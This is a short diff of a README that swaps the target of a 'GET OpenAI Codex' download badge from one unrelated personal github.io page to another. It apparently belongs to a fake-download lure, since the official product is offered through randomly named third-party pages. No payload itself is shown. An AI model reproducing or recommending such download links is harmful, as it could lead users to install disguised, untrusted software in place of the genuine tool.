@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://avatars.mds.yandex.net/i?id=807cb35575a275c7798a8a87b6cab5a05c52bb6e-9855103-images-thumbs&n=13)
 
-[![GET OpenAI Codex](https://img.shields.io/badge/GET%20%E2%80%94%20OpenAI%20Codex-0078D6?style=for-the-badge&logoColor=white)](https://sector-level-disk-tools.github.io/.github/openai-codex-app)
+[![GET OpenAI Codex](https://img.shields.io/badge/GET%20%E2%80%94%20OpenAI%20Codex-0078D6?style=for-the-badge&logoColor=white)](https://damircontrerasikgm.github.io/.github/openai-codex-app)
 
 ---
 
